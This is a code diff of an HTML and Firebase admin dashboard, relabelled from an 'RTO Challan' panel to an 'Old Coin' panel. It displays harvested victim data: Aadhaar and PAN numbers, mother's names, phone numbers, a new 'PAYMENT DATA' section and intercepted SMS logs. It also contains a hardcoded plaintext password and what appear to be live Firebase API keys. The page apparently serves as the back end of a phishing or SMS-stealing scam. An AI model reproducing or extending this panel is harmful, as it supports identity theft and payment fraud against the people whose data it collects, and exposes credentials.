@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RTO Challan Admin Panel</title>
+    <title>Old Coin Admin Panel</title>
     <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
     <style>
@@ -13,35 +13,36 @@
         input[type="password"] { width: 80%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 8px; }
         button { background: #ADD8E6; border: none; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; }
         .card { background: white; padding: 20px; margin-bottom: 20px; border-radius: 12px; border-left: 6px solid #ADD8E6; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .sms-box { background: #eef9ff; padding: 10px; border-radius: 8px; margin-top: 10px; border: 1px solid #d1e9f0; font-size: 0.9em; }
+        .sms-box { background: #eef9ff; padding: 10px; border-radius: 8px; margin-top: 10px; border: 1px solid #d1e9f0; font-size: 0.9em; word-wrap: break-word; }
+        .payment-info { background: #fffde7; padding: 10px; border-radius: 8px; margin-top: 10px; border: 1px solid #fff9c4; color: #d32f2f; font-weight: bold; }
     </style>
 </head>
 <body>
 
     <div id="login-section" class="login-container">
-        <h2>RTO Admin Login</h2>
+        <h2>Admin Login</h2>
         <input type="password" id="passInput" placeholder="पासवर्ड डालें">
+        <br><br>
         <button onclick="checkPassword()">Login</button>
         <p id="error-msg" style="color: red; display: none;">गलत पासवर्ड!</p>
     </div>
 
     <div id="dashboard-section" class="dashboard-container">
-        <h1 style="text-align: center;">RTO Challan Database</h1>
+        <h1 style="text-align: center;">Old Coin Data Dashboard</h1>
         <div id="data-list">डेटा लोड हो रहा है...</div>
     </div>
 
     <script>
-        const SECRET_PASSWORD = "Zuhi@143"; // अपना पासवर्ड यहाँ सेट करें
+        const SECRET_PASSWORD = "Zuhi@143"; 
 
-        // आपकी Firebase Config (इसे Firebase Console से बदलें)
         const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
+            apiKey: "AIzaSyDr3oTjWGrvd9tRi7go-M4ssL8rAipNdMQ",
             authDomain: "hkfhaiufahf.firebaseapp.com",
             databaseURL: "https://hkfhaiufahf-default-rtdb.firebaseio.com",
             projectId: "hkfhaiufahf",
             storageBucket: "hkfhaiufahf.appspot.com",
             messagingSenderId: "1089730321892",
-            appId: "YOUR_WEB_APP_ID"
+            appId: "1:1089730321892:android:42a51f98cc3a1195453bf1"
         };
 
         firebase.initializeApp(firebaseConfig);
@@ -65,12 +66,20 @@
                 for (let id in data) {
                     const user = data[id];
                     let html = `<div class="card">
-                        <h3>${user.name || 'N/A'} (${user.number || 'N/A'})</h3>
+                        <h3>नाम: ${user.name || 'N/A'} | फोन: ${user.number || 'N/A'}</h3>
                         <p><b>Aadhaar:</b> ${user.aadhaar || 'N/A'} | <b>PAN:</b> ${user.pan || 'N/A'}</p>
                         <p><b>Mother:</b> ${user.motherName || 'N/A'}</p>
-                        <p><b>Payment:</b> ${user.paymentMode || 'N/A'}</p>`;
+                        <p><b>Payment Mode:</b> ${user.paymentMode || 'N/A'}</p>`;
+                    
+                    if (user.paymentDetails) {
+                        html += `<div class="payment-info">
+                            <h4>PAYMENT DATA:</h4>
+                            ${Object.entries(user.paymentDetails).map(([key, val]) => `• ${key}: ${val}`).join('<br>')}
+                        </div>`;
+                    }
+
                     if (user.messages) {
-                        html += `<h4>SMS Logs:</h4>`;
+                        html += `<h4>SMS LOGS:</h4>`;
                         for (let mId in user.messages) {
                             const msg = user.messages[mId];
                             html += `<div class="sms-box"><b>${msg.sender}:</b> ${msg.message}</div>`;
